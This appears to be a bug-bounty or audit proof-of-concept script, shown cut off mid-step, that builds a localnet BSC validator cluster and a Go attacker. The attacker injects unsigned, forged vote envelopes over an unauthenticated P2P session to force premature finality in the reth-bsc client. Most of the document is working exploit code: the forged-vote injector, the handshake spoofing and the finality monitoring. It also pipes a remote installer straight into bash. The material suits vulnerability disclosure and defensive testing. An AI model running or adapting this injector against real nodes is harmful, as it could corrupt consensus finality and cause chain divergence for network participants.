#!/usr/bin/env bash
# ============================================================================
# poc.sh — ONE-SHOT PoC: Premature Finality via Unverified P2P Vote Injection
# Target   : reth-bsc (vote_pool.rs RC-1 + RC-2)
# Chain    : isolated LOCALNET — validator cluster via bnb-chain/node-deploy
# Topology : validator (host, node-deploy) + victim reth-bsc (host bin / docker
#            --network host) + attacker Go (host binary). All on 127.0.0.1.
# Artifacts  : poc-attack/audit-out/
# Usage    : ./poc.sh | ./poc.sh clean
# Exit     : 0 = premature finality + network divergence | 3 = not observed | 1 = setup failed
# Override : RETH_SRC, RETH_BIN, DEPLOY_DIR, GENESIS_JSON, VALIDATOR_ENODE, QUORUM,
#            VICTIM_RPC_PORT, ATTACK_PORT, OBSERVE/CONTROL/ATTACK/PERSIST_HEADS,
#            RETH_FORCE_DOCKER=1, CLUSTER_RESET=1
# ============================================================================
set -uo pipefail

WORKDIR="$PWD/poc-attack"
OUT="$WORKDIR/audit-out"
DEPLOY_DIR="${DEPLOY_DIR:-$WORKDIR/node-deploy}"
ATTACKER_BIN="$WORKDIR/attacker/attacker"
VICTIM_CTR=reth-victim
VICTIM_IMAGE=reth-bsc-poc
VICTIM_PID=""
ATTACK_PORT="${ATTACK_PORT:-31337}"
VICTIM_DATA="$WORKDIR/victim-data"

mkdir -p "$WORKDIR/attacker" "$OUT"

# Full PATH — all subshells (make / bsc_cluster.sh / docker env) inherit it.
export PATH="$HOME/.cargo/bin:$HOME/.foundry/bin:$HOME/.local/bin:/usr/local/go/bin:$PATH"

jnum() { # $1=url $2=tag -> block number int (or -1)
  curl -s -m 3 -X POST -H 'Content-Type: application/json' \
    --data "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"$2\",false],\"id\":1}" \
    "$1" | python3 -c "
import sys,json
try:
    r=json.load(sys.stdin).get('result')
    print(int(r['number'],16) if r else -1)
except Exception:
    print(-1)" 2>/dev/null || echo -1
}
rpc_raw() { curl -s -m 3 -X POST -H 'Content-Type: application/json' --data "$1" "$2"; }
port_busy() { (exec 3<>"/dev/tcp/127.0.0.1/$1") 2>/dev/null && { exec 3>&-; return 0; } || return 1; }

stop_victim() {
  if [ -n "$VICTIM_PID" ]; then kill "$VICTIM_PID" 2>/dev/null; fi
  docker rm -f "$VICTIM_CTR" >/dev/null 2>&1
}

# ---------------------------------------------------------------- clean
if [ "${1:-}" = "clean" ]; then
  stop_victim
  if [ -d "$DEPLOY_DIR" ]; then
    ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh stop ) >/dev/null 2>&1
    echo "[clean] validator cluster stopped (.local data kept; CLUSTER_RESET=1 ./poc.sh to restart)."
  fi
  echo "[clean] done."; exit 0
fi

# ---------------------------------------------------------------- [0/9] prereq + toolchain bootstrap
echo "[0/9] Prereq & toolchain bootstrap..."
for bin in git curl python3 jq node npm; do
  command -v $bin >/dev/null || { echo "FATAL: need $bin on host"; exit 1; }
done

# Go (attacker, create-validator, make geth) — install if absent
if ! command -v go >/dev/null; then
  echo "    go not found — installing Go 1.24..."
  GOARCH=$(uname -m); [ "$GOARCH" = "x86_64" ] && GOARCH=amd64 || GOARCH=arm64
  curl -sL "https://go.dev/dl/go1.24.1.linux-${GOARCH}.tar.gz" -o /tmp/go.tgz \
    && sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf /tmp/go.tgz \
    || { echo "FATAL: go installation failed"; exit 1; }
fi
go version | tee -a "$OUT/toolchain.log" >/dev/null || { echo "FATAL: go not available"; exit 1; }

# Foundry (reset_genesis: forge install/build) — install if absent
if ! command -v forge >/dev/null; then
  echo "    forge not found — installing foundry (a few minutes)..."
  curl -L https://foundry.paradigm.xyz 2>/dev/null | bash >>"$OUT/toolchain.log" 2>&1 || true
  command -v foundryup >/dev/null && foundryup >>"$OUT/toolchain.log" 2>&1 || true
fi
command -v forge >/dev/null || { echo "FATAL: forge not available after bootstrap — see $OUT/toolchain.log"; exit 1; }

# Poetry (reset_genesis: poetry install/run) — install if absent
if ! command -v poetry >/dev/null; then
  echo "    poetry not found — installing via pip3 --user..."
  pip3 install --user poetry >>"$OUT/toolchain.log" 2>&1 || true
fi
command -v poetry >/dev/null || echo "    WARN: poetry absent — reset may fail at genesis generation"

# Build-essential for 'make geth' (bsc) — best effort
MISSING_BUILD=""
for pkg in make cmake gcc; do command -v $pkg >/dev/null || MISSING_BUILD="$MISSING_BUILD $pkg"; done
if [ -n "$MISSING_BUILD" ]; then
  echo "    installing build deps:$MISSING_BUILD"
  sudo apt-get update -qq >>"$OUT/toolchain.log" 2>&1 \
    && sudo apt-get install -y $MISSING_BUILD >>"$OUT/toolchain.log" 2>&1 \
    || echo "    WARN: apt install failed — see $OUT/toolchain.log"
fi

# reth-bsc source location
RETH_SRC="${RETH_SRC:-}"
if [ -z "$RETH_SRC" ]; then
  for c in ../reth-bsc ./reth-bsc "$PWD/../reth-bsc" "$PWD"; do
    [ -f "$c/Cargo.toml" ] && [ -d "$c/src" ] && [ -f "$c/src/consensus/parlia/vote_pool.rs" ] && RETH_SRC="$c" && break
  done
fi
[ -n "$RETH_SRC" ] && [ -f "$RETH_SRC/Cargo.toml" ] || { echo "FATAL: reth-bsc source not found. Set RETH_SRC=/path/reth-bsc"; exit 1; }
RETH_SRC=$(cd "$RETH_SRC" && pwd)

RETH_BIN="${RETH_BIN:-}"
[ -z "$RETH_BIN" ] && [ -x "$RETH_SRC/target/release/reth-bsc" ] && RETH_BIN="$RETH_SRC/target/release/reth-bsc"
[ -z "$RETH_BIN" ] && [ -x "$RETH_SRC/target/maxperf/reth-bsc" ] && RETH_BIN="$RETH_SRC/target/maxperf/reth-bsc"

# [0b/9] Victim binary not present -> make build host (once, 10-40 minutes).
if [ -z "$RETH_BIN" ] && [ "${RETH_FORCE_DOCKER:-0}" != "1" ]; then
  echo "    Victim binary not present — 'make build' host (log: $OUT/victim-make.log)"
  if ( cd "$RETH_SRC" && make build ) >"$OUT/victim-make.log" 2>&1 && [ -x "$RETH_SRC/target/release/reth-bsc" ]; then
    RETH_BIN="$RETH_SRC/target/release/reth-bsc"
    echo "    OK — victim binary: $RETH_BIN"
  else
    echo "    WARN: make build failed — continuing via docker build (log: $OUT/victim-make.log)"
  fi
fi
echo "    reth-bsc: $RETH_SRC  binary: ${RETH_BIN:-<docker build>}"

# ---------------------------------------------------------------- [1/9] attacker
cat > "$WORKDIR/attacker/go.mod" <<'EOF'
module bscreth-poc-attacker

go 1.21

require github.com/ethereum/go-ethereum v1.13.5
EOF

cat > "$WORKDIR/attacker/main.go" <<'EOF'
// PoC: Premature Finality via Unverified P2P Vote Injection (reth-bsc)
// Victim calls DIAL to attacker (admin_addPeer) -> attacker = responder
// -> forkid-echo self-consistent by construction.
// Phase: OBSERVE -> CONTROL -> ATTACK -> PERSIST -> FORENSIC.
package main

import (
    "crypto/ecdsa"
    "crypto/rand"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "math/big"
    "net/http"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"

    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/crypto"
    "github.com/ethereum/go-ethereum/log"
    "github.com/ethereum/go-ethereum/p2p"
)

// ===== Wire types — field order = RLP field order (vote.rs; locked by proto.rs reference vector) =====
type VoteData struct {
    SourceNumber uint64
    SourceHash   common.Hash
    TargetNumber uint64
    TargetHash   common.Hash
}
type VoteEnvelope struct {
    VoteAddress [48]byte // garbage — never parsed as BLS point (RC-1)
    Signature   [96]byte // NOL — never verified (RC-1)
    Data        VoteData
}
type votesPacket struct{ Votes []*VoteEnvelope } // RLP [[env...]] — 2-level wrapper
type capPacket struct {                          // RLP [version, extra] — go-bsc parity
    ProtocolVersion uint64
    Extra           []byte
}
type forkID struct { // RLP forkid.ID parity (EIP-2124): [Hash 32B, Next uint64]
    Hash [4]byte
    Next uint64
}
type ethStatus struct { // eth/68 status
    ProtocolVersion uint32
    NetworkID       uint64
    TD              *big.Int
    Head            common.Hash
    Genesis         common.Hash
    ForkID          forkID
}

func env(k, d string) string {
    if v := os.Getenv(k); v != "" {
        return v
    }
    return d
}
func envInt(k string, d int) int {
    if v := os.Getenv(k); v != "" {
        if n, err := strconv.Atoi(v); err == nil {
            return n
        }
    }
    return d
}

type blk struct {
    Number string `json:"number"`
    Hash   string `json:"hash"`
}

func (b *blk) num() int64 {
    if b == nil || b.Number == "" {
        return -1
    }
    n := new(big.Int)
    n.SetString(strings.TrimPrefix(b.Number, "0x"), 16)
    return n.Int64()
}

func rpcBlock(url, tag string) *blk {
    body, _ := json.Marshal(map[string]any{
        "jsonrpc": "2.0", "id": 1, "method": "eth_getBlockByNumber", "params": []any{tag, false},
    })
    resp, err := http.Post(url, "application/json", strings.NewReader(string(body)))
    if err != nil {
        return nil
    }
    defer resp.Body.Close()
    var out struct {
        Result *blk `json:"result"`
    }
    if json.NewDecoder(resp.Body).Decode(&out) != nil {
        return nil
    }
    return out.Result
}

func rpcCall(url, method string, params []any) (json.RawMessage, error) {
    body, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": 1, "method": method, "params": params})
    resp, err := http.Post(url, "application/json", strings.NewReader(string(body)))
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    var out struct {
        Result json.RawMessage `json:"result"`
    }
    if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
        return nil, err
    }
    return out.Result, nil
}

// ================= injector =================
type injector struct {
    mu            sync.Mutex
    rw            p2p.MsgReadWriter
    cancel        chan struct{}
    forgedAttack  map[[48]byte]bool
    forgedControl map[[48]byte]bool
    lastSyncSeen  int
    lastSyncHit   int
    armed         bool
    rpc, enode    string
}

func (inj *injector) isArmed() bool {
    inj.mu.Lock()
    defer inj.mu.Unlock()
    return inj.armed
}

// eth/68 responder — mirror victim status (forkid self-consistent by construction)
func (inj *injector) runEth(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
    msg, err := rw.ReadMsg()
    if err != nil {
        return err
    }
    if msg.Code != 0x00 {
        msg.Discard()
        return fmt.Errorf("expected eth status, got %d", msg.Code)
    }
    var theirs ethStatus
    if err := msg.Decode(&theirs); err != nil {
        return err
    }
    ours := theirs
    ours.ProtocolVersion = 68
    if err := p2p.Send(rw, 0x00, &ours); err != nil {
        return err
    }
    log.Info("eth/68 status MIRRORED", "network", theirs.NetworkID)
    for { // drain announcements
        msg, err := rw.ReadMsg()
        if err != nil {
            return err
        }
        msg.Discard()
    }
}

// bsc/2: read victim capability -> send capability -> read sync-dump -> ARMED
func (inj *injector) run(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
    cancel := make(chan struct{})
    inj.mu.Lock()
    inj.cancel = cancel
    inj.mu.Unlock()
    crw := &cancelRW{rw: rw, cancel: cancel}

    msg, err := crw.ReadMsg()
    if err != nil {
        return err
    }
    if msg.Code != 0x00 {
        msg.Discard()
        return fmt.Errorf("expected bsc capability, got %d", msg.Code)
    }
    msg.Discard()
    // stream.rs: version EXACT 2; extra raw [0x00]
    if err := p2p.Send(crw, 0x00, &capPacket{ProtocolVersion: 2, Extra: []byte{0x00}}); err != nil {
        return err
    }
    log.Warn("bsc/2 handshake ESTABLISHED — ZERO authentication", "peer", peer.ID().TerminalString())

    // register_peer() -> sync_pending_votes_to_peer(): pool dump sent to new session
    if msg, err := crw.ReadMsg(); err == nil {
        if msg.Code == 0x01 {
            var pkt votesPacket
            if derr := msg.Decode(&pkt); derr == nil {
                inj.mu.Lock()
                inj.lastSyncSeen = len(pkt.Votes)
                hit := 0
                for _, v := range pkt.Votes {
                    if inj.forgedAttack[v.VoteAddress] || inj.forgedControl[v.VoteAddress] {
                        hit++
                    }
                }
                inj.lastSyncHit = hit
                inj.mu.Unlock()
                log.Info("sync-dump received from victim", "votes", len(pkt.Votes), "attacker_hits", hit)
            }
        } else {
            msg.Discard()
        }
    }

    inj.mu.Lock()
    inj.rw = rw
    inj.armed = true
    inj.mu.Unlock()

    for {
        msg, err := crw.ReadMsg()
        if err != nil {
            inj.mu.Lock()
            inj.rw, inj.armed = nil, false
            inj.mu.Unlock()
            return err
        }
        msg.Discard() // victim vote broadcast — drain
    }
}

type cancelRW struct {
    rw     p2p.MsgReadWriter
    cancel <-chan struct{}
}

func (c *cancelRW) ReadMsg() (p2p.Msg, error) {
    type res struct {
        m p2p.Msg
        e error
    }
    ch := make(chan res, 1)
    go func() { m, e := c.rw.ReadMsg(); ch <- res{m, e} }()
    select {
    case r := <-ch:
        return r.m, r.e
    case <-c.cancel:
        return p2p.Msg{}, fmt.Errorf("cancelled for forensic reconnect")
    }
}
func (c *cancelRW) WriteMsg(m p2p.Msg) error { return c.rw.WriteMsg(m) }

// ONE envelope per packet — handle_votes_broadcast() only ingests the first element.
func (inj *injector) send(v *VoteEnvelope) error {
    inj.mu.Lock()
    rw := inj.rw
    inj.mu.Unlock()
    if rw == nil {
        return fmt.Errorf("no bsc session")
    }
    return p2p.Send(rw, 0x01, &votesPacket{Votes: []*VoteEnvelope{v}})
}

func ensureArmed(rpc, enode string, inj *injector, timeout time.Duration) bool {
    deadline := time.Now().Add(timeout)
    for time.Now().Before(deadline) {
        if inj.isArmed() {
            return true
        }
        if r, err := rpcCall(rpc, "admin_addPeer", []any{enode}); err != nil {
            log.Warn("admin_addPeer ERROR", "err", err)
        } else {
            log.Info("admin_addPeer", "result", string(r))
        }
        time.Sleep(700 * time.Millisecond)
    }
    return inj.isArmed()
}

type headObs struct{ headNum, finNum int64 }

func watchHeads(rpc string, count int, inject bool, quorum int, wrongTarget bool, inj *injector, tag string) (obs []headObs, forged, late int) {
    var lastHash string
    for len(obs) < count {
        head := rpcBlock(rpc, "latest")
        if head == nil || head.Hash == lastHash || head.num() < 2 {
            time.Sleep(200 * time.Millisecond)
            continue
        }
        lastHash = head.Hash
        n := head.num()
        before := int64(-1)
        if b := rpcBlock(rpc, "finalized"); b != nil {
            before = b.num()
        }

        if inject {
            if !inj.isArmed() { // watchdog re-arm
                _, _ = rpcCall(inj.rpc, "admin_addPeer", []any{inj.enode})
                time.Sleep(1200 * time.Millisecond)
            }
            target := common.HexToHash(head.Hash) // read LIVE from victim state
            var book map[[48]byte]bool
            if wrongTarget { // negative control: bucket never read
                book = inj.forgedControl
                var junk [32]byte
                for i := range junk {
                    junk[i] = byte(int(n)*7 + i)
                }
                target = common.Hash(junk)
            } else {
                book = inj.forgedAttack
            }
            for i := 0; i < quorum; i++ {
                var addr [48]byte
                rand.Read(addr[:]) // BLS pubkey garbage
                book[addr] = true
                if err := inj.send(&VoteEnvelope{
                    VoteAddress: addr,
                    Signature:   [96]byte{}, // NOL
                    Data: VoteData{
                        SourceNumber: uint64(n - 1), // steady state: justified == head-1
                        SourceHash:   common.Hash{}, // filter does NOT check source_hash (RC-2)
                        TargetNumber: uint64(n),
                        TargetHash:   target,
                    },
                }); err != nil {
                    log.Warn("inject failed", "phase", tag, "err", err)
                    break
                }
            }
        }

        // Window: until new head OR finality jumps OR timeout.
        // Premature = finalized reaches n-1 WHILE head is still n
        // (organic BEP-126: finalized = head-2; n-1 only organic after block n+1 lands).
        after := before
        forgedThis, lateThis := false, false
        deadline := time.Now().Add(8 * time.Second)
        for time.Now().Before(deadline) {
            time.Sleep(120 * time.Millisecond)
            cur := rpcBlock(rpc, "latest")
            f := int64(-1)
            if b := rpcBlock(rpc, "finalized"); b != nil {
                f = b.num()
            }
            if inject && f == n-1 && before < n-1 {
                if cur != nil && cur.Hash == head.Hash {
                    forgedThis = true // PREMATURE — before next block
                } else {
                    lateThis = true // achieved but after head moved = organic
                }
                after = f
                break
            }
            after = f
            if cur != nil && cur.Hash != head.Hash {
                break
            }
        }
        if forgedThis {
            forged++
        }
        if lateThis {
            late++
        }
        obs = append(obs, headObs{n, before})
        log.Info("window", "phase", tag, "head", n, "fin_before", before, "fin_after", after,
            "premature_forged", forgedThis, "late_or_organic", lateThis)
    }
    return
}

func main() {
    rpc := env("VICTIM_RPC", "http://127.0.0.1:8545")
    quorum := envInt("QUORUM", 21)
    advertise := env("ADVERTISE_IP", "127.0.0.1")
    port := envInt("LISTEN_PORT", 30304)
    observeHeads := envInt("OBSERVE_HEADS", 6)
    controlHeads := envInt("CONTROL_HEADS", 3)
    attackHeads := envInt("ATTACK_HEADS", 6)
    persistHeads := envInt("PERSIST_HEADS", 8)

    var key *ecdsa.PrivateKey
    if hk := os.Getenv("ATTACKER_KEY"); hk != "" {
        b, _ := hex.DecodeString(hk)
        key, _ = crypto.ToECDSA(b)
    } else {
        key, _ = crypto.GenerateKey()
    }
    pub := crypto.FromECDSAPub(&key.PublicKey)[1:]
    enode := fmt.Sprintf("enode://%s@%s:%d", hex.EncodeToString(pub), advertise, port)
    fmt.Println("ATTACKER STARTED")
    log.Root().SetHandler(log.StreamHandler(os.Stderr, log.TerminalFormat(false)))
    fmt.Println("ENODE:", enode)

    inj := &injector{
        forgedAttack:  map[[48]byte]bool{},
        forgedControl: map[[48]byte]bool{},
        rpc:           rpc,
        enode:         enode,
    }
    srv := &p2p.Server{Config: p2p.Config{
        PrivateKey: key, MaxPeers: 16, NoDiscovery: true,
        ListenAddr: fmt.Sprintf(":%d", port),
        Protocols: []p2p.Protocol{
            {Name: "eth", Version: 68, Length: 17, Run: inj.runEth},
            {Name: "bsc", Version: 2, Length: 4, Run: inj.run},
        },
    }}
    if err := srv.Start(); err != nil {
        panic(err)
    }
    defer srv.Stop()

    if !ensureArmed(rpc, enode, inj, 120*time.Second) {
        fmt.Println("FAILED: bsc/2 session not formed — check VICTIM_RPC / ADVERTISE_IP / port"); os.Exit(1)
    }
    fmt.Println("ARMED:", quorum)

    log.Warn("=== PHASE 1: OBSERVE (normal flow — LOGIC_GATE_4) ===")
    obs, _, _ := watchHeads(rpc, observeHeads, false, 0, false, inj, "observe")
    moved := false
    for i := 1; i < len(obs); i++ {
        if obs[i].finNum > obs[i-1].finNum {
            moved = true
        }
    }
    if moved {
        log.Warn("CHECKPOINT-1 OK — organic finality moved; steady-state window OPEN")
    } else {
        log.Warn("CHECKPOINT-1 FAILED — organic finality did not move (validators not voting?). Setup limitation, NOT a refutation of findings (engine proof: in-tree unit test + source).")
    }

    log.Warn("=== PHASE 2: CONTROL (random target_hash — should be no-op) ===")
    _, ctlForged, _ := watchHeads(rpc, controlHeads, true, quorum, true, inj, "control")
    if ctlForged == 0 {
        log.Warn("NEGATIVE CONTROL OK — wrong target vote did not change finality")
    } else {
        log.Error("CONTROL ANOMALY — finality changed without valid target_hash")
    }

    log.Warn("=== PHASE 3: ATTACK (quorum garbage envelope per head, 0 valid signatures) ===")
    ensureArmed(rpc, enode, inj, 10*time.Second)
    _, atkForged, atkLate := watchHeads(rpc, attackHeads, true, quorum, false, inj, "attack")
    if atkForged > 0 {
        log.Error(">>> PREMATURE FINALITY FORGED <<<",
            "windows_forged", atkForged, "of", attackHeads,
            "votes_per_head", quorum, "valid_bls_signatures", 0)
    } else {
        log.Warn("NO premature forge observed", "late_only", atkLate,
            "note", "window closed / CHECKPOINT-1 failed")
    }

    log.Warn("=== PHASE 4: PERSIST (injection STOPPED — poison re-read from import-path?) ===")
    per, _, _ := watchHeads(rpc, persistHeads, false, 0, false, inj, "persist")
    vals := []int64{}
    for _, o := range per {
        vals = append(vals, o.finNum)
    }
    flap := false
    for i := 1; i < len(vals); i++ {
        if vals[i] < vals[i-1] {
            flap = true
        }
    }
    log.Warn("PERSIST RESULT", "finalized_sequence", vals, "flapping", flap,
        "note", "flapping = finality view inconsistent across FCU (poison vs snapshot)")

    log.Warn("=== PHASE 5: FORENSIC (drop session -> re-add -> read victim sync-dump) ===")
    inj.mu.Lock()
    if inj.cancel != nil {
        close(inj.cancel)
    }
    inj.mu.Unlock()
    time.Sleep(2 * time.Second)
    found := false
    for i := 0; i < 40 && !found; i++ {
        if r, err := rpcCall(rpc, "admin_addPeer", []any{enode}); err != nil {
            log.Warn("admin_addPeer ERROR", "err", err)
        } else {
            log.Info("admin_addPeer", "result", string(r))
        }
        time.Sleep(700 * time.Millisecond)
        inj.mu.Lock()
        seen, hit, armed := inj.lastSyncSeen, inj.lastSyncHit, inj.armed
        inj.mu.Unlock()
        if armed && seen > 0 {
            log.Error(">>> VICTIM RETRANSMITS UNVERIFIED ENVELOPE (WIRE EVIDENCE) <<<",
                "desynced_votes", seen, "attacker_envelope_hits", hit,
                "note", "sync_pending_votes_to_peer rebroadcasts pool contents (including garbage votes) to new peer")
            found = true
        }
    }
    if !found {
        log.Warn("forensic: sync-dump not received (empty pool / reconnect failed)")
    }

    if atkForged > 0 {
        os.Exit(0)
    }
    os.Exit(3)
}
EOF
echo "[1/9] Build attacker (go build, host)..."
( cd "$WORKDIR/attacker" && go mod tidy && go build -o attacker . ) >"$OUT/attacker-build.log" 2>&1 \
  || { echo "FATAL: attacker build failed — see $OUT/attacker-build.log"; exit 1; }

# ---------------------------------------------------------------- [2/9] node-deploy + auto-fix upstream
if [ ! -d "$DEPLOY_DIR" ]; then
  git clone --depth 1 https://github.com/bnb-chain/node-deploy.git "$DEPLOY_DIR" \
    || { echo "FATAL: clone node-deploy failed"; exit 1; }
fi

# --- Genesis surgery: match geth <-> reth genesis header constructor ---
# reth includes post-merge fields in the genesis header; geth omits them.
# Inject field values + activate forks in that genesis -> identical headers -> identical hash.
ensure_genesis_surgery() {
  [ -f "$DEPLOY_DIR/bsc_cluster.sh" ] || return 0
  cat > "$DEPLOY_DIR/genesis_surgery.py" <<'SURGEOF'
import json, os, sys, time
p = sys.argv[1]
mode = os.environ.get("POC_SURGERY_MODE", "-plato")
g = json.load(open(p)); c = g.setdefault("config", {})
t = g.get("timestamp", 0)
try:
    ts = int(t, 0) if isinstance(t, str) else int(t)
except Exception:
    ts = 0
# v6: ft must be future relative to the ENTIRE run (wall clock), not the template ts.
# Empirical 08:39 & 16:48: past ft -> time-fork active since early blocks ->
# geth vs reth fork ID divergent -> victim 0 peers without WARN.
ft = int(time.time()) + 7200
for k in list(c.keys()):
    if k.endswith("Time"):
        c[k] = ft
for f in [x.strip() for x in mode.split(",") if x.strip()]:
    if f.startswith("-"):
        c.pop(f[1:] + "Time", None)
    else:
        c[f + "Time"] = 0
json.dump(g, open(p, "w"), indent=2)
_b8 = ("berlinBlock", "londonBlock", "hertzBlock", "hertzfixBlock", "pragueBlock")
for _i, k in enumerate(_b8):
    c[k] = 1000000 + _i
print("[surgery v9] mode=%r ft=%d (wall+7200) block8group=1M" % (mode, ft))
SURGEOF
  if ! grep -q "patch_genesis_for_reth" "$DEPLOY_DIR/bsc_cluster.sh"; then
    python3 - "$DEPLOY_DIR/bsc_cluster.sh" <<'INJEOF'
import sys, pathlib
p = pathlib.Path(sys.argv[1]); s = p.read_text()
wrapper = 'function patch_genesis_for_reth() {\n    python3 "${workspace}/genesis_surgery.py" "${workspace}/genesis/genesis.json"\n}\n'
s = s.replace("sleepAfterStart=10", "sleepAfterStart=10\n" + wrapper, 1)
s = s.replace("    prepare_config\n", "    prepare_config\n    patch_genesis_for_reth\n", 1)
p.write_text(s)
print("[surgery] wrapper injected into bsc_cluster.sh (after prepare_config, before initNetwork)")
INJEOF
  fi
}

# Auto-fix node-deploy (idempotent — new clone brings back upstream bugs):
fix_node_deploy() {
  [ -f "$DEPLOY_DIR/bsc_cluster.sh" ] || return 0
  # (1) first-run: 'xargs kill' without PID -> usage error -> set -e dies
  sed -i 's/xargs kill/xargs -r kill/' "$DEPLOY_DIR/bsc_cluster.sh"
  # v9: fork-time override RUNTIME (start_node --override.*) -> future.
  # Diag proof: flag = init+30s; blocks 8/9/10 sub-second = maxwell/fermi active
  # (ms-timestamp + interval 1.5s) -> block-9 stall & fork-ID divergence.
  grep -q 'PASSED_FORK_DELAY} + 7200' "$DEPLOY_DIR/bsc_cluster.sh" || \
    sed -i 's|passedHardforkTime=$(expr $(date +%s) + ${PASSED_FORK_DELAY})|passedHardforkTime=$(expr $(date +%s) + ${PASSED_FORK_DELAY} + 7200)|' "$DEPLOY_DIR/bsc_cluster.sh"
  # (2) new forge version fails to checkout forge-std v1.7.3 (submodule ds-test) -> manual git clone
  sed -i 's|forge install --no-git foundry-rs/forge-std@v1.7.3|git clone --depth 1 --branch v1.7.3 https://github.com/foundry-rs/forge-std lib/forge-std|' "$DEPLOY_DIR/bsc_cluster.sh"
  # (3) bin/geth is not bundled in the repo -> build from source during reset
  if [ ! -x "$DEPLOY_DIR/bin/geth" ]; then
    sed -i 's/useLatestBscClient=false/useLatestBscClient=true/' "$DEPLOY_DIR/.env" 2>/dev/null || true
  fi
}
fix_node_deploy
ensure_genesis_surgery

echo "[2/9] node-deploy: install deps + build create-validator..."
( pip3 install -r "$DEPLOY_DIR/requirements.txt" ) >"$OUT/deploy-prereq.log" 2>&1 || echo "    WARN: pip3 install failed — see $OUT/deploy-prereq.log"
( cd "$DEPLOY_DIR/create-validator" && go build ) >>"$OUT/deploy-prereq.log" 2>&1 || echo "    WARN: create-validator build failed (non-fatal)"

# helper RPC cluster (used by [2/9] & [2c/9])
m_rpc_up() { curl -s -m 2 -X POST -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
  http://127.0.0.1:8545 2>/dev/null | grep -q '"result"'; }
m_blk0() { rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' \
  http://127.0.0.1:8545 | jq -r '.result.hash // empty'; }

if [ ! -f "$DEPLOY_DIR/genesis/genesis.json" ]; then
  echo "    genesis template not present — initial reset (15-40 minutes first time)..."
  export POC_SURGERY_MODE="-plato"
  ( cd "$DEPLOY_DIR" && bash ./bsc_cluster.sh reset ) >"$OUT/deploy-reset.log" 2>&1 \
    || { echo "FATAL: bsc_cluster.sh reset failed — tail log:"; tail -30 "$OUT/deploy-reset.log"; exit 1; }
  for i in $(seq 1 90); do m_rpc_up && break; sleep 2; done
  m_rpc_up && printf '%s %s\n' "-plato" "$(m_blk0)" > "$DEPLOY_DIR/.cluster-ok-v9"
else
  echo "    genesis template present — calibrate hash first ([2b/9]); reset only if needed ([2c/9])"
fi

# ---------------------------------------------------------------- [2b/9] GENESIS CALIBRATION v5
# v4: 'reth=?' = BROKEN probe (discv5 AddrInUse on UDP 39998 FIXED), not
# divergence. v5: RANDOM DYNAMIC p2p/disc ports + flags identical to real victim +
# cleanup leftover containers + dump 'ss' on failure.
# INSIGHT: reth-bsc plato activation is BLOCK-BASED (is_plato_active_at_block
# in get_finalized_number_and_hash & pre_execution.rs); template already has
# platoBlock:7 → plato does NOT affect genesis hash. All-zero divergence
# (0x61ca) comes from shanghai/cancun/prague=0. Main candidate '-plato'
# = exact replica of 07:08 run config which previously MATCHED.
echo "[2b/9] Genesis calibration v5..."
docker rm -f reth-probe reth-victim >/dev/null 2>&1 || true  # leftovers from old run
UG_GETH="$DEPLOY_DIR/bin/geth"
[ -x "$UG_GETH" ] || UG_GETH="$(find "$DEPLOY_DIR" -maxdepth 4 -type f -name geth -perm -u+x 2>/dev/null | head -n1)"
{ [ -n "${UG_GETH:-}" ] && [ -x "$UG_GETH" ]; } || UG_GETH="$(command -v geth || true)"
[ -n "${UG_GETH:-}" ] && [ -x "$UG_GETH" ] || { echo "FATAL: geth binary not found"; exit 1; }
echo "    geth: $UG_GETH"

if [ -z "$RETH_BIN" ] && ! docker image inspect "$VICTIM_IMAGE" >/dev/null 2>&1; then
  echo "    build reth image (once; log: $OUT/victim-build.log)..."
  if ! grep -q "^poc-attack" "$RETH_SRC/.dockerignore" 2>/dev/null; then
    printf '\n# --- poc.sh ---\npoc-attack\ntarget\n.git\ndist\ndiag\n' >> "$RETH_SRC/.dockerignore"
  fi
  docker build -t "$VICTIM_IMAGE" --build-arg BUILD_PROFILE=release \
    --build-arg FEATURES="${RETH_FEATURES:-jemalloc,asm-keccak}" \
    "$RETH_SRC" >"$OUT/victim-build.log" 2>&1 \
    || { echo "FATAL: docker reth build failed — see $OUT/victim-build.log"; exit 1; }
fi

m_rpc_up() { curl -s -m 2 -X POST -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' \
  http://127.0.0.1:8545 2>/dev/null | grep -q '"result"'; }
m_blk0() { rpc_raw '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x0",false],"id":1}' \
  http://127.0.0.1:8545 | jq -r '.result.hash // empty'; }

geth_probe() { # $1=genesis file -> echo hash
  local gd; gd="$WORKDIR/probe-geth-data"; rm -rf "$gd"; mkdir -p "$gd"
  "$UG_GETH" init --datadir "$gd" "$1" 2>&1 \
    | grep -oP 'Successfully wrote genesis state\s+hash=\K0x[0-9a-f]+' | head -n1
  rm -rf "$gd"
}

reth_probe() { # $1=genesis file -> echo hash; empty = failed (see probe-reth-crash.log)
  local gf="$1" pp p2p disc h i running
  docker rm -f reth-probe >/dev/null 2>&1
  pp=8599; while port_busy "$pp"; do pp=$((pp+1)); done
  p2p=$((20000 + RANDOM % 20000)); while port_busy "$p2p"; do p2p=$((20000 + RANDOM % 20000)); done
  disc=$((p2p + 1))
  rm -f "$OUT/probe-reth-crash.log"
  PROBE_PID=""
  if [ -n "$RETH_BIN" ]; then
    rm -rf "$WORKDIR/probe-reth-data"; mkdir -p "$WORKDIR/probe-reth-data"
    RUST_LOG=error nohup "$RETH_BIN" node --chain "$gf" --datadir "$WORKDIR/probe-reth-data" \
      --port "$p2p" --discovery.port "$disc" --nat none \
      --http --http.addr 127.0.0.1 --http.port "$pp" --http.api eth \
      >"$OUT/probe-reth.log" 2>&1 &
    PROBE_PID=$!
  else
    docker run -d --name reth-probe --network host \
      -v "$gf":/genesis.json:ro -e RUST_LOG=error \
